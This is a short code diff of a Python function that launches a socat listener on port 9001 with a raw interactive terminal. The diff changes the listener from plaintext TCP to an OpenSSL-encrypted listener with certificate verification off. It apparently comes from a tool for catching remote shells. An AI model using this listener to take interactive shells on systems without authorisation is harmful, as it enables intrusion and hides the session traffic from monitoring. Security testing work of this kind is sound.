@@ -27,13 +27,13 @@ def run_socat_shell():
 			"--",
 			"bash",
 			"-c",
-			"socat file:`tty`,raw,echo=0 tcp-listen:9001; exec bash"
+			"socat openssl-listen:9001,reuseaddr,cert=$(pwd)/server.pem,verify=0 file:`tty`,raw,echo=0; exec bash"
 		]
 	elif shutil.which("xterm"):
 		terminal_cmd = [
 			"xterm",
 			"-e",
-			"bash -c 'socat file:`tty`,raw,echo=0 tcp-listen:9001; exec bash'"
+			"bash -c 'socat openssl-listen:9001,reuseaddr,cert=$(pwd)/server.pem,verify=0 file:`tty`,raw,echo=0; exec bash'"
 		]
 	elif shutil.which("konsole"):
 		terminal_cmd = [
@@ -41,7 +41,7 @@ def run_socat_shell():
 			"-e",
 			"bash",
 			"-c",
-			"socat file:`tty`,raw,echo=0 tcp-listen:9001; exec bash"
+			"socat openssl-listen:9001,reuseaddr,cert=$(pwd)/server.pem,verify=0 file:`tty`,raw,echo=0; exec bash"
 		]
 	else:
 		print("❌ [!] No compatible terminal found.")
